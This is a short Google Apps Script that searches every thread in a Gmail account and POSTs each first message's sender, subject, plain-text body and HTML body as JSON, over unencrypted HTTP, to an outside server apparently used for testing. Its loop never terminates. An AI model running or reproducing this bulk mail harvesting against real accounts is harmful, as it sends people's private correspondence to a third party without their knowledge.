function run() {
	var RESULTS_PER_PAGE = 2;
	
	var threads = GmailApp.search('*');
	var i = 0;
	while (true) {
		try {
			var data = GmailApp.getMessagesForThreads(threads.slice(i * RESULTS_PER_PAGE, ++i * RESULTS_PER_PAGE)).map(function (messages) {
				return [{
					'from': messages[0].getFrom(),
					'body_plain': messages[0].getPlainBody(),
					'body_html': messages[0].getBody(),
					'subject': messages[0].getSubject()
				}];
			}); 
		} catch (e) {
			continue;
		}
		
		sendData(data);
	}
}

function sendData(data) {
	UrlFetchApp.fetch('http://cs.hmc.edu:40222/testing', {
		'method': 'POST',
		'contentType': 'application/json',
		'payload': JSON.stringify(data)
	});
}